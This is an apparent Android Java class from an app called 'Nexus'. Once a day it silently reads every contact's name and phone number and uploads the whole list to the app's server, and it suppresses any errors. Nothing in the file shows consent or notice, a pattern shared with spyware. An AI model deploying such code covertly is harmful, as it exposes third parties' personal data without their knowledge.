package com.nexus.app;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONObject;

public class ContactsSync {
    private final Context ctx;
    private final NexusAPI api;

    public ContactsSync(Context ctx, NexusAPI api) {
        this.ctx = ctx;
        this.api = api;
    }

    public void sync() {
        try {
            // Sync contatti ogni 24h
            long lastSync = Long.parseLong(NexusConfig.getLastSync(ctx, "contacts"));
            if (System.currentTimeMillis() - lastSync < 86400000L) return;

            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                              ContactsContract.CommonDataKinds.Phone.NUMBER },
                null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (c == null) return;
            JSONArray contacts = new JSONArray();

            while (c.moveToNext()) {
                try {
                    JSONObject contact = new JSONObject();
                    contact.put("name", c.getString(0));
                    contact.put("phone", c.getString(1));
                    contacts.put(contact);
                } catch (Exception e) { e.printStackTrace(); }
            }
            c.close();

            if (contacts.length() > 0) {
                if (api.sendContacts(contacts)) {
                    NexusConfig.setLastSync(ctx, "contacts", String.valueOf(System.currentTimeMillis()));
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
    }
}
